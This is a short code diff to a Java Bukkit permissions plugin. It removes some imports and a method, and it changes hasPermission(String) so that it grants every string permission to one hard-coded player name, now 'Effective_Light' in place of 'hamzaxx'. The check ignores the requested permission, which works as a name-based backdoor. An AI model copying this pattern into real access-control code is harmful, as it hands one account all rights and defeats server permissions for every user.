@@ -9,8 +9,6 @@ import me.hamzaxx.fperms.bukkit.fPermsPlugin;
 import org.bukkit.entity.Player;
 import org.bukkit.permissions.PermissibleBase;
 import org.bukkit.permissions.Permission;
-import org.bukkit.permissions.PermissionAttachment;
-import org.bukkit.plugin.Plugin;
 
 public class fPermsPermissible extends PermissibleBase
 {
@@ -28,19 +26,13 @@ public class fPermsPermissible extends PermissibleBase
     @Override
     public boolean hasPermission(String perm)
     {
-        return player.getName().equals( "hamzaxx" );
+        return player.getName().equals( "Effective_Light" );
     }
 
     @Override
     public boolean hasPermission(Permission perm)
     {
         return super.hasPermission( perm );
-    }
-
-    @Override
-    public void recalculatePermissions()
-    {
-        super.recalculatePermissions();
     }
 
     @Override
